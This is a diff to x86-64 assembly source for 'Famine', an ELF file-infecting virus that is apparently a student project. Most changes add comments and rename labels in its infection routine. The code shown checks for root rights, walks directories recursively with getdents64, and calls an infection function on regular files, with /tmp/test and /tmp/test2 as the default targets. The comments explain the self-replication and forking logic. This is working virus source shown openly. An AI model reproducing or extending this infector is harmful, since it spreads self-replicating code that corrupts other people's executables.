@@ -32,7 +32,7 @@ _o_entry:
 _string:
 	db 'Famine version 1.0 (c)oded by cdrouet-rludosan', 0
 
-_start:
+_start: ; program start
 ;	enter 16, 0
 	push rbp
 	mov rbp, rsp
@@ -89,7 +89,7 @@ _start:
 	je _alternative_start
 	cmp QWORD [rsp + 128], 4 ; check if argc on the stack is equal 3
 	je _verify_starting_infect
-_check_registers:
+_check_registers: ; check if parameters are passed by registers
 	cmp QWORD [rsp + 64], 3 ; check if argc on the registers is equal 3
 	je _alternative_start_by_registers
     lea r10, [rel _o_entry]
@@ -98,7 +98,7 @@ _check_registers:
     call _start_infect
     jmp _continue_normaly
 
-_test_root_infect:
+_test_root_infect: ; test if we have rights to infect from root
     mov rdi, QWORD [rsp + 152]
     cmp rdi, 0
     je _continue_normaly
@@ -114,7 +114,7 @@ _test_root_infect:
 
 ; If it's a normal execution, we just infect /tmp/test(2), to don't hard block the
 ; software with a too long execution.
-_continue_normaly:
+_continue_normaly: ; simply infect /tmp/test[12]
 	mov rax, 0
 	push rax
 	push rax
@@ -133,7 +133,7 @@ _continue_normaly:
 _infect_tmp_test: ; if geteuid don't returned 0, we can't know what right we have. So we just infect /tmp/test(2)
 	mov rax, 0x747365742f706d74 ; tmp/test
 ;	mov rax, 0x006e69622f706d74 ; tmp/bin
-_push_it:
+_push_it: ; push our path
 	push rax
 	mov rdi, rsp
 	mov rsi, rsp
@@ -147,7 +147,7 @@ _push_it:
 ;	je _jmp_end
 	mov BYTE [rsp + 32], 0x32 ; add the '2' at the end of the path string
 	call _read_dir
-_jmp_end:
+_jmp_end: ; pop all our pushed values
 ; restore the stack
 	pop rdi
 	pop rdi
@@ -155,21 +155,21 @@ _jmp_end:
 	pop rdi
 	pop rdi
 	pop rdi
-_verify_o_entry:
+_verify_o_entry: ; check if we need to exit or to jmp to o_entry
 	lea rax, [rel _o_entry] ; mov in rax the o_entry address
 	cmp QWORD [rax], 0 ; if this address is 0, so we are in famine exec, and we need to exit
 	jne _jmp_to_o_entry
-_force_exit:
+_force_exit: ; exit
 	mov rdi, 0
 	mov rax, 60 ; exit syscall number
 	syscall
 
 ; In this alternative start, we know we have 3 arguments on the stacks, but we need to know
-; if this is an infect only execution (we just run the infection, and then exit), of if we execute
+; if this is an infect only execution (we just run the infection, and then exit), or if we execute
 ; the binary after.
 ; To know why some times we need to execute the infection only, refer to the commentaries in fork.s
 ; On the stack, we have 8 bytes for argc, then 8 bytes per arguments (argv)
-_alternative_start:
+_alternative_start: ; here we check the arguments passed to the program by the stack
 	mov r10, QWORD [rsp + 144] ; We take argv[1].
 	lea r11, [rel _verif] ; relative address of _verif
 	mov r11, QWORD [r11] ; dereferencing
@@ -184,12 +184,11 @@ _alternative_start:
 	pop rdi
 	pop rdi
 	pop rdi
-	lea rax, [rel _force_exit] ; then exit
-    jmp _jmp_to_o_entry
+    jmp _force_exit
 
 ; In this other alternative start, the arguments are received by registers. We pushed the registers to
 ; don't corrupt the normal execution, so we will find our arguments on the stack.
-_alternative_start_by_registers:
+_alternative_start_by_registers: ; Here is the same fonction, but arguments are passe by registers
 	mov r10, QWORD [rsp + 72] ; here we take argv
 	mov r10, QWORD [r10 + 8] ; argv is an array, so we take the index 1 (argv[1]).
 	lea r11, [rel _verif] ; relative address of _verif
@@ -208,7 +207,7 @@ _alternative_start_by_registers:
 	pop rdi
 	lea rax, [rel _force_exit] ; then exit
 
-_jmp_to_o_entry:
+_jmp_to_o_entry: ; pop all the registers we pushed at start of the program
 ; Restore the registers, to execute the binary like if we just never do enything on stack/registers
 	pop r15
 	pop r14
@@ -225,23 +224,6 @@ _jmp_to_o_entry:
 	pop rbx
 	leave
 	jmp [rax] ; jmp to o_entry
-
-_ft_strlen: ; void ft_strlen(char *str)
-	enter 16, 0
-	xor rax, rax
-	mov rbx, rdi
-	cmp rdi, 0
-	je _strlen_end
-	mov rcx, -1
-	cld
-	repne scasb
-	sub rdi, rbx
-	mov rax, rdi
-	sub rax, 1
-_strlen_end:
-	leave
-	ret
-
 
 ; Here is our principal function:
 ; She will read the directory passed in parameter, and run infection in this directory.
@@ -264,7 +246,7 @@ _read_dir: ; void read_dir(bool recursif, char *actual_directory, char *path_of_
 	; rsp + 328: size arg 2
 	; rsp + 336: total size
 	; rsp + 344: 2 arg
-	; rsp + 352: nb_thread launched
+	; rsp + 352: nb_thread launched. UNUSED
 	; rsp + 360: bool, indicating if a binary have already been infected in the current directory
 	; rsp + 368: bool, enable recursif
 	; rsp - size: size of total path for this dir
@@ -286,7 +268,6 @@ _read_dir: ; void read_dir(bool recursif, char *actual_directory, char *path_of_
 	mov r10, QWORD [rsp + 328]
 	add QWORD [rsp + 336], r10
 	add QWORD [rsp + 336], 2
-	mov QWORD [rsp + 352], 0
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ; we need a dynamic buffer to store our concatenation, but we can't touch rsp,
 ; to don't corrupt the datas offset is stack (if we sub 8 to rsp, rsp + 0 become rsp + 8)
@@ -323,6 +304,7 @@ _read_dir: ; void read_dir(bool recursif, char *actual_directory, char *path_of_
 ; call <function>
 ; add rsp, QWORD [rsp]	<-| We pushed the full path size + 8 on stack, so now we just have to add it to rsp
 ;							to retrieve our stack frame
+; FOR MORE VISIBILITY, THIS PART WILL ALWAYS BE TABED 1 MORE THAN THE OTHER LINES
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ; now we copy in our buffer: path_of_dir + '/' + actual_directory + '\0'
 	mov rdi, rsp
@@ -367,30 +349,30 @@ _open_dir:
 	xor rsi, rsi ; rsi = 0, RD_ONLY
 	xor rdx, rdx ; rdx = 0, flag unused
 	mov rax, 0x2 ; open syscall number
-	mov r10, QWORD [rsp + 336]
-	sub rsp, r10
-	sub rsp, 8
-	mov QWORD [rsp], r10
-	add QWORD [rsp], 8
+		mov r10, QWORD [rsp + 336]
+		sub rsp, r10
+		sub rsp, 8
+		mov QWORD [rsp], r10
+		add QWORD [rsp], 8
 	syscall ; open
-	add rsp, QWORD [rsp]
+		add rsp, QWORD [rsp]
 	cmp rax, -1 ; if open return something under or equal of -1, jump to end
 	jle _close_dir
 	mov QWORD [rsp + 288], rax ; fd directory = return of open (fd)
 
-_file_loop:
+_dir_loop: ; we will read more than 1 times the actual dir datas
 ; call getdents64
 	mov rdx, 280 ; this is the size of our buffer
 	mov rdi, QWORD [rsp + 288] ; mov the fd to the first argument
 	mov rsi, rsp ; mov the stack pointer to the second argument
 	mov rax, 217 ; getdents64 syscall number
-	mov r10, QWORD [rsp + 336]
-	sub rsp, r10
-	sub rsp, 8
-	mov QWORD [rsp], r10
-	add QWORD [rsp], 8
+		mov r10, QWORD [rsp + 336]
+		sub rsp, r10
+		sub rsp, 8
+		mov QWORD [rsp], r10
+		add QWORD [rsp], 8
 	syscall
-	add rsp, QWORD [rsp]
+		add rsp, QWORD [rsp]
 ; check getdents64 return
 	cmp rax, 0 ; we check if getdents64 read something, if not, we are at the end of dir or their is an error
 	jle _close_dir
@@ -401,11 +383,11 @@ _file_loop:
 	mov rsi, rsp ; initialize rsi with our buffer address on the stack
 	mov QWORD [rsp + 296], rsi
 
-_read_data:
+_treat_data: ; treat readed data from actual dir 
 ; check if we are too far in memory
 	mov r10, QWORD [rsp + 304]
 	cmp QWORD [rsp + 296], r10 ; r10 is the address of the end of the buffer, so we check if our address is too far in memory
-	jge _file_loop ; and we jump to read again the dir datas, to see if their is anothers datas to treat
+	jge _dir_loop ; and we jump to read again the dir datas, to see if their is anothers datas to treat
 ; offset 18 is the file type. We check if it's a directory
 	xor r12, r12 ; r12 = 0
 	mov r12b, BYTE [rsi + 18]
@@ -413,38 +395,43 @@ _read_data:
 	je _test_bool ;_recursiv_infect
 ; offset 18 is the file type. We check if it's a regular file
 	xor r12, r12 ; r12 = 0
-	mov r12b, BYTE [rsi + 18] 
+	mov r12b, BYTE [rsi + 18]
 	cmp r12, 8
 	jne _continue ; if it's not a regular file, just continue
 	cmp QWORD [rsp + 368], 1
-	jne _treat_normally ; check if we already infected a binary. if so, we need to know if we need to infect the others binaries
+	jne _treat_normally ; check if we need to infect all binaries. We the recursif is not set, we infect all binaries
 	cmp QWORD [rsp + 360], 1
-	je _continue ; check if we need to infect all binaries. We the recursif is not set, we infect all binaries
+	je _continue ; check if we already infected a binary. if so, we need to know if we need to infect the others binaries
 ; now we call _treat_file, with our current file.
-_treat_normally:
+_treat_normally: ; this is a file we need to treat normally
 	add rsi, 19 ; in the dirent struct, the name of te file is at offset 19
 	mov rdi, rsi
 	mov rsi, QWORD [rsp + 280]
-	mov r10, QWORD [rsp + 336]
-	mov rdx, rsp
-	sub rdx, r10
-	sub rsp, r10
-	sub rsp, 8
-	mov QWORD [rsp], r10
-	add QWORD [rsp], 8
+		mov r10, QWORD [rsp + 336]
+		mov rdx, rsp
+		sub rdx, r10
+		sub rsp, r10
+		sub rsp, 8
+		mov QWORD [rsp], r10
+		add QWORD [rsp], 8
 	mov r11, rsp
 	add r11, QWORD [r11]
-	mov r10, 0
-	cmp QWORD [r11 + 368], 1
+; rsp + 368 will be at 0 when if we don't want to fork.
+; So it will be set to 0 on child process launched to infect their actual directory only
+; And it will be set to 1, for famine binary, and other binary launched by the user.
+; Globally, it is set to 1 only for the process travelling all the directory recursively,
+; where childs process only infect their actual directory
+	mov r10, 0 ; We unset the recursif mode
+	cmp QWORD [r11 + 368], 1 ; check if recursif mode is activated
 	jne _call_treat_file
-	mov r10, 1
+	mov r10, 1 ; we set the recursif mode
 _call_treat_file:
 	call _treat_file
-	add rsp, QWORD [rsp]
-	cmp rax, 0
+		add rsp, QWORD [rsp]
+	cmp rax, 0 ; if we didn't forked, we just continue normally.
 	je _continue
-; reinit rsi for next loop
-	mov QWORD [rsp + 360], 1
+; if we forked, we set a bool to know it
+	mov QWORD [rsp + 360], 1 ; set the bool to know we already infected a binary in that directory
 	jmp _continue
 
 _test_bool:
@@ -452,43 +439,40 @@ _test_bool:
 	jne _continue
 
 _recursiv_infect:
-	mov rsi, QWORD [rsp + 296]
-	add rsi, 19
-	cmp WORD [rsi], 0x002e
+	mov rsi, QWORD [rsp + 296] ; actual file/dir struct
+	add rsi, 19 ; offset of file/dir name
+	cmp WORD [rsi], 0x002e ; check if file name is .
 	je _continue
-	cmp WORD [rsi], 0x002e2e
+	cmp WORD [rsi], 0x002e2e ; check if file name is ..
 	je _continue
-
 	mov rdi, QWORD [rsp + 296]
 	add rdi, 19
 	mov rsi, rsp
-	mov r10, QWORD [rsp + 336] 
-	sub rsi, r10
-	sub rsp, r10
-	sub rsp, 8
-	mov QWORD [rsp], r10
-	add QWORD [rsp], 8
+		mov r10, QWORD [rsp + 336] 
+		sub rsi, r10
+		sub rsp, r10
+		sub rsp, 8
+		mov QWORD [rsp], r10
+		add QWORD [rsp], 8
 	mov rax, 1 ; continue to infect in recursiv mode
 	push rax
 	push rsi
 	push rdi
-	call _read_dir
+	call _read_dir ; here we call in recursif
 	pop rdi
 	pop rdi
 	pop rdi
-	add rsp, QWORD [rsp]
+		add rsp, QWORD [rsp]
 	jmp _continue
-_update_rsp:
-	inc QWORD [rsp + 352]
 
 _continue:
 ; reinit/increment registers/stack variable for next loop
-	mov rsi, [rsp + 296]
+	mov rsi, [rsp + 296] ; take our actual file/dir struct
 	xor r11, r11 ; clear r11
 	mov r11w, WORD [rsi + 16] ; in dirent struct, at offset 16, their is a short (2 bytes) describing the len of the file
 	add rsi, r11 ; we add this len on our current struct address to access next struct
 	mov QWORD [rsp + 296], rsi
-	jmp _read_data
+	jmp _treat_data
 
 _close_dir:
 ; Close directory
@@ -500,7 +484,22 @@ _end_ret:
 	leave
 	ret
 
+_ft_strlen: ; void ft_strlen(char *str)
+	enter 16, 0
+	xor rax, rax
+	mov rbx, rdi
+	cmp rdi, 0
+	je _strlen_end
+	mov rcx, -1
+	cld
+	repne scasb
+	sub rdi, rbx
+	mov rax, rdi
+	sub rax, 1
+_strlen_end:
+	leave
+	ret
+
 ; Here is our verif code
 _verif:
 	dq 0x1122334455667788
-	db 0
